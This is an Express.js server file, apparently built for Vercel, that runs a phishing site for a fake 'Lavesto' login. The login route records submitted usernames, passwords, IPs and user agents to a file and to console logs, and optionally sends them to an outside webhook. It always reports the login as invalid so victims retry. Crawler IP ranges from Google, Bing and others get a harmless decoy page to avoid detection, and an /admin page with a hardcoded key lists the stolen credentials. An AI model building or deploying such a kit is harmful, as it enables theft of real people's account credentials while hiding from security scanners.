const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();

// Set EJS as the view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '..', 'views'));

// Parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ─── Obfuscated Field Names ───
const FIELD_USER = 'u_' + crypto.randomBytes(3).toString('hex');
const FIELD_PASS = 'p_' + crypto.randomBytes(3).toString('hex');

// ─── IP Filtering — Block known crawlers ───
const BLOCKED_RANGES = [
  '66.249.0.0/16',   // Googlebot
  '74.125.0.0/16',   // Google
  '35.191.0.0/16',   // Google Cloud
  '130.211.0.0/16',  // Google Cloud
  '64.233.160.0/19', // Google
  '216.58.192.0/19', // Google
  '173.194.0.0/16',  // Google
  '207.126.144.0/20',// Google
  '72.14.192.0/18',  // Google
  '199.59.148.0/22', // Twitterbot
  '157.55.39.0/24',  // Bingbot
  '40.77.167.0/24',  // Bingbot
  '20.0.0.0/8',      // Microsoft/Azure
  '162.125.0.0/16',  // Cloudflare crawlers
];

function ipInRange(ip, ranges) {
  if (!ip || ip === '::1' || ip === '127.0.0.1') return false;
  const ipNum = ip.split('.').reduce((acc, oct) => (acc << 8) + parseInt(oct, 10), 0) >>> 0;
  for (const range of ranges) {
    const [base, bits] = range.split('/');
    const mask = ~(2 ** (32 - parseInt(bits)) - 1);
    const baseNum = base.split('.').reduce((acc, oct) => (acc << 8) + parseInt(oct, 10), 0) >>> 0;
    if ((ipNum & mask) === (baseNum & mask)) return true;
  }
  return false;
}

// ─── Route: Home page ───
app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  
  // Block known crawlers — show them a benign page
  if (ipInRange(ip, BLOCKED_RANGES)) {
    return res.send(`<!DOCTYPE html><html><head><title>Lavesto</title></head><body style="background:#1a282f;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>Welcome to Lavesto</h1></body></html>`);
  }

  const error = req.query.error;
  res.render('index', { error: error === 'invalid' ? 'invalid' : '' });
});

// ─── Route: Login handler ───
app.post('/login', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'Unknown';
  
  // Block crawlers
  if (ipInRange(ip, BLOCKED_RANGES)) {
    return res.redirect('/');
  }

  const username = (req.body[FIELD_USER] || req.body.username || '').trim();
  const password = req.body[FIELD_PASS] || req.body.password || '';
  
  // Skip empty submissions
  if (!username || !password) {
    return res.redirect('/?error=invalid');
  }

  const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Store to /tmp (ephemeral on Vercel)
  const dataFile = path.join('/tmp', 'creds.json');
  let structured = [];
  if (fs.existsSync(dataFile)) {
    try { structured = JSON.parse(fs.readFileSync(dataFile, 'utf8')); } catch(e) { structured = []; }
  }

  structured.push({ timestamp, ip, username, password, user_agent: userAgent });
  fs.writeFileSync(dataFile, JSON.stringify(structured, null, 2));

  // Also log to console for `vercel logs`
  console.log(`[CRED] ${timestamp} | ${ip} | ${username} : ${password}`);

  // ⚠️ Set WEBHOOK_URL to a webhook.site URL for persistent storage
  const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
  if (WEBHOOK_URL) {
    const https = require('https');
    const payload = JSON.stringify({ timestamp, ip, username, password, user_agent: userAgent });
    const urlObj = new URL(WEBHOOK_URL);
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
      timeout: 3000
    };
    const reqHttp = https.request(options, () => {});
    reqHttp.on('error', () => {});
    reqHttp.write(payload);
    reqHttp.end();
  }

  res.redirect('/?error=invalid');
});

// ─── Route: View captured credentials ───
app.get('/admin', (req, res) => {
  const key = req.query.key;
  if (key !== 'P3nt3st3r!2024') {
    return res.status(401).send('Access denied.');
  }

  const dataFile = path.join('/tmp', 'creds.json');
  let structured = [];
  if (fs.existsSync(dataFile)) {
    try { structured = JSON.parse(fs.readFileSync(dataFile, 'utf8')); } catch(e) { structured = []; }
  }

  const total = structured.length;
  const uniqueIps = new Set(structured.map(e => e.ip)).size;

  let rows = '';
  for (let i = structured.length - 1; i >= 0; i--) {
    const e = structured[i];
    rows += `<tr><td>${structured.length - i}</td><td>${e.timestamp}</td><td>${e.ip}</td><td>${e.username}</td><td style="color:#ff6b6b;">${e.password}</td></tr>`;
  }

  res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Captured Data</title>
<style>
body{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ff00;padding:20px}
h1{color:#ff4444}
table{width:100%;border-collapse:collapse;margin-top:20px}
th{background:#1a1a1a;color:#ff4444;padding:10px;text-align:left;border-bottom:2px solid #333}
td{padding:10px;border-bottom:1px solid #222;word-break:break-all}
tr:hover{background:#111}
.stats{margin:20px 0;display:flex;gap:20px}
.stat-box{background:#1a1a1a;border:1px solid #333;padding:15px;border-radius:4px}
.stat-box .num{font-size:28px;font-weight:bold;color:#00ff00}
</style>
</head>
<body>
<h1>CAPTURED CREDENTIALS</h1>
<div class="stats">
<div class="stat-box"><div class="num">${total}</div><div>Total</div></div>
<div class="stat-box"><div class="num">${uniqueIps}</div><div>Unique IPs</div></div>
</div>
<table>
<tr><th>#</th><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>
${rows || '<tr><td colspan="5" style="text-align:center;color:#666;">No credentials captured yet</td></tr>'}
</table>
</body>
</html>`);
});

// ─── Health check ───
app.get('/health', (req, res) => {
  res.send('OK');
});

module.exports = app;